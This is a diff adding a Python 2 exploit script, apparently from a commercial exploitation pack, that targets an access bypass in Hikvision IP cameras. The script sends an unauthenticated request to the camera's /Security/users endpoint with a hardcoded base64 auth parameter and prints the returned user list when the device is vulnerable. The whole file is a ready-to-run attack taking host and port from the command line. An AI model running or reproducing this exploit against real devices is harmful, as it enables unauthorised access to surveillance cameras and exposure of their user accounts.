@@ -1,0 +1,42 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_hikvision_1'
+_vendor_ = 'hikvision'
+_model_  = ['IP Camera']
+_vuln_   = 'Access Bypass Vulnerability'
+_cve_    = ''
+_ref_    = 'https://packetstormsecurity.com/files/144097/Hikvision-IP-Camera-Access-Bypass.html'
+_port_   = 88
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/Security/users?auth=YWRtaW46MTEK' % (host,port)
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  elif 'Access Error' in response.text:
+    print '[+] %s not vulnerable' % host  
+  else:
+    print '[+] %s vulnerable' % host
+    print '[+] URL: %s\n'%url
+    print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
